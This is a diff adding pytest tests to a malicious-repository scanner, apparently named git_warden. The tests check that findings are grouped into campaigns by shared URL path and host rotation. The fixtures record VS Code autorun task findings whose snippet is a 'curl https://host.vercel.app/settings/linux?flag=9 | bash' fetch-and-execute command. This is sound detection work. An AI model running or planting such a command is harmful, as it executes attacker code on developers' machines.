@@ -122,3 +122,54 @@ def test_distinct_domains_are_not_merged():
     hr = {"example.com": {"a/1"}, "api.example.com": {"b/2"}}
     merged = _merge_truncated_hosts(hr)
     assert set(merged) == {"example.com", "api.example.com"}
+
+
+def test_campaign_context_reports_cluster_and_rotation(tmp_path):
+    import json as _json
+
+    from git_warden.db import Database
+    from git_warden.osm_submit import campaign_context
+    db = Database.open(tmp_path / "t.sqlite")
+
+    def add(name, host):
+        payload = {"confidence": "auto", "bash_findings": [
+            {"file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
+             "rule": "vscode-autorun",
+             "snippet": f"curl https://{host}/settings/linux?flag=9 | bash"}]}
+        db.conn.execute(
+            "INSERT INTO repo_findings (full_name, url, detection_method, status, "
+            "score, raw_payload) VALUES (?,?,?,?,?,?)",
+            (name, f"https://github.com/{name}", "signature_match", "confirmed", 5,
+             _json.dumps(payload)))
+
+    add("a/one", "host1.vercel.app")
+    add("b/two", "host2.vercel.app")
+    add("c/three", "host3.vercel.app")
+    db.conn.commit()
+    row = db.conn.execute("SELECT * FROM repo_findings WHERE full_name='a/one'").fetchone()
+    ctx = campaign_context(db, row)
+    assert "one of 3" in ctx                       # 3 repos in the cluster
+    assert "3 distinct hosts" in ctx               # rotation breadth
+    assert "settings/linux?flag=" in ctx           # shared path fingerprint
+    assert "--" not in ctx and "—" not in ctx  # no dashes
+    db.close()
+
+
+def test_campaign_context_empty_for_a_lone_repo(tmp_path):
+    import json as _json
+
+    from git_warden.db import Database
+    from git_warden.osm_submit import campaign_context
+    db = Database.open(tmp_path / "t.sqlite")
+    payload = {"confidence": "auto", "bash_findings": [
+        {"file": "x", "line": 0, "category": "install_hook", "rule": "vscode-autorun",
+         "snippet": "curl https://only.vercel.app/settings/linux?flag=9 | bash"}]}
+    db.conn.execute(
+        "INSERT INTO repo_findings (full_name, url, detection_method, status, score, raw_payload)"
+        " VALUES (?,?,?,?,?,?)",
+        ("solo/repo", "https://github.com/solo/repo", "signature_match", "confirmed", 5,
+         _json.dumps(payload)))
+    db.conn.commit()
+    row = db.conn.execute("SELECT * FROM repo_findings WHERE full_name='solo/repo'").fetchone()
+    assert campaign_context(db, row) == ""  # no cluster, no sentence
+    db.close()
